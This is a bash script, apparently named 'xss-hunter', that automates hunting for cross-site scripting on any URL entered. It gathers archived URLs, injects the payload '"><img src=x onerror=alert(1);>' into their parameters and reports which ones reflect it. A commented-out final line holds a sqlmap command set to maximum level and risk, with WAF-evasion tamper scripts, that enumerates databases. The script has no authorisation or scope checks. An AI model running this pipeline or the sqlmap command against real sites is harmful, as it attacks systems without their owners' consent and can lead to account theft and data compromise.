# !/bin/bash
# automate find xss
# bersih bersih
clear
tput civis
# path
path=$(pwd)
# cek root
cek_root() {
    if [ "$(whoami)" != "root" ]; then
        echo "Anda harus menjalankan skrip ini sebagai root."
        exit 1
    fi
}
# Panggil fungsi cek_root
cek_root
# check requirements
function req(){
# Periksa apakah perintah sudah terpasang
if ! command -v xss &> /dev/null
then
    go install github.com/K1M4K-ID/xss@latest &> /dev/null
    mv /root/go/bin/xss /usr/local/bin
else
    sleep 0.01
fi
if ! command -v waybackurls &> /dev/null
then
    go install github.com/tomnomnom/waybackurls@latest &> /dev/null
    mv /root/go/bin/waybackurls /usr/local/bin
else
    sleep 0.01
fi
if ! command -v qsreplace &> /dev/null
then
    go install github.com/tomnomnom/qsreplace@latest &> /dev/null
    mv /root/go/bin/qsreplace /usr/local/bin
else
    sleep 0.01
fi
if ! command -v uro &> /dev/null
then
    pip3 install uro &> /dev/null
else
    sleep 0.01
fi
if ! command -v gf &> /dev/null
then
    go install github.com/tomnomnom/gf@latest &> /dev/null
    mv /root/go/bin/gf /usr/local/bin
    sleep 0.01
else
    sleep 0.01
fi
if [[ -d "$path/Gf-Patterns" ]];
then
    sleep 0.1
else
    git clone https://github.com/1ndianl33t/Gf-Patterns &> /dev/null;mkdir -p /root/.gf;mv $path/Gf-Patterns/*.json /root/.gf;rm -r $path/Gf-Patterns
fi
}
req
# banner
function banner(){
printf "\033[32;3m"
cat << "EOF"
                           .__                  __                
___  ___  ______ ______    |  |__  __ __  _____/  |_  ___________ 
\  \/  / /  ___//  ___/    |  |  \|  |  \/    \   __\/ __ \_  __ \
 >    <  \___ \ \___ \     |   Y  \  |  /   |  \  | \  ___/|  | \/
/__/\_ \/____  >____  > /\ |___|  /____/|___|  /__|  \___  >__|   
      \/     \/     \/  \/      \/           \/          \/       

[*] xss-hunter V.1
[*] automate find xss - code by K1M4K-ID

EOF
}

banner
read -p "$(printf "\033[37;1m[\033[31;1m*\033[37;1m] input url>"'\033[34;1m')" url
printf "\033[0m\n"
waybackurls $url | gf xss | uro | qsreplace '"><img src=x onerror=alert(1);>' | xss | egrep -v 'Not'
printf "\033[0m\n"
tput cnorm

#$ sqlmap -m urls.sqli --level 5 --risk 3 --batch --dbs -p 'item1' --tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,ifnull2ifisnull,modsecurityversioned

